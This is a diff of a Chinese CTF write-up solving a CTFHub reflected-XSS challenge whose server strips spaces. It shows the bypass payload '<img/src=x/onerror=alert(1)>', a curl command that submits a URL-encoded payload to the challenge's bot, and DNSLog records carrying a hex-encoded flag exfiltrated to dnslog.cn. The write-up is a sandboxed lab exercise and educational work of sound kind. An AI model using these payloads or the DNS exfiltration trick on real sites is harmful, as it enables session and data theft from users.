@@ -6,13 +6,9 @@ date: 2026-10-26
 categories: CTF
 tags: [CTFHub, Web, 技能树]
 ---
-
-# CTFHub Writeup - 过滤空格(XSS) 
-
+# CTFHub Writeup - 过滤空格(XSS)
 ## 题目类型
-
 WEB
-
 ## 0x01 题目信息
 | 项目 | 内容 |
 | --- | --- |
@@ -26,7 +22,7 @@ WEB
 ## 0x02 漏洞原理
 这是反射型 XSS 的进阶版：页面仍然把 `name` 原样输出到 `<h1>Hello, ...</h1>`，但**服务端会把输入里的空格删掉**。
 先验证过滤行为：
-```
+```text
 ?name=<img src=x onerror=alert(1)>
 回显：<h1>Hello, <imgsrc=xonerror=alert(1)>
 ```
@@ -39,31 +35,31 @@ WEB
 ## 0x03 解题过程
 **3.1 找注入点**
 访问：
-```
+```text
 http://challenge-bcc0efec3d9adadc.sandbox.ctfhub.com:10800/?name=CTFHub
 ```
 页面回显 `Hello, CTFHub`。输入一个带标签的测试串：
-```
+```text
 ?name=<script>alert(1)</script>
 ```
 响应里原样出现 `<script>alert(1)</script>`，没有被转义，说明存在反射型 XSS。
 **3.2 确认空格被删**
 用带空格的标签测试：
-```
+```text
 ?name=<img src=x onerror=alert(1)>
 ```
 回显变成：
-```
+```text
 <h1>Hello, <imgsrc=xonerror=alert(1)>
 ```
 空格全没了。再试 `a b c`，回显是 `abc`，确认服务端是**删除空格**，而不是报错或拦截。
 **3.3 用 `/` 代替空格**
 HTML 允许用 `/` 分隔标签名和属性，把空格换成 `/`：
-```
+```text
 ?name=<img/src=x/onerror=alert(1)>
 ```
 回显：
-```
+```text
 <h1>Hello, <img/src=x/onerror=alert(1)>
 ```
 浏览器会把它解析成 `<img src="x" onerror="alert(1)">`，`onerror` 正常触发。
@@ -85,8 +81,9 @@ HTML 允许用 `/` 分隔标签名和属性，把空格换成 `/`：
 - 最后用 `i.src` 触发一个 GET 请求，实际效果是发起 DNS 查询。
 **3.5 提交给 Bot**
 页面下方有「Send URL to Bot」，对应的接口是 `POST /submit`，并且要**表单编码**：
-```
-curl -X POST --data-urlencode "url=http://challenge-...:10800/?name=<URL编码后的payload>" \
+```bash
+curl -X POST \
+  --data-urlencode "url=http://challenge-...:10800/?name=<URL编码后的payload>" \
   http://challenge-...:10800/submit
 ```
 返回：
@@ -96,15 +93,15 @@ curl -X POST --data-urlencode "url=http://challenge-...:10800/?name=<URL编码�
 说明 Bot 已经开始访问。注意 payload 要先做 URL 编码，否则 Bot 拿到的 URL 里 `<`、`"` 可能被处理掉。
 **3.6 接收并解码**
 用 DNSLog 接收（访问 `getdomain.php` 拿域名，访问 `getrecords.php` 看记录）。几秒后拿到：
-```
+```text
 666c61673d6374666875627b30646638633338396538363331.30313734616635396530387d.q8clvj.dnslog.cn
 ```
 把两段十六进制拼起来解码：
-```
+```text
 flag=ctfhub{0df8c389e86310174af59e08}
 ```
 得到 Flag：
-```
+```text
 ctfhub{0df8c389e86310174af59e08}
 ```
 **3.7 验证**
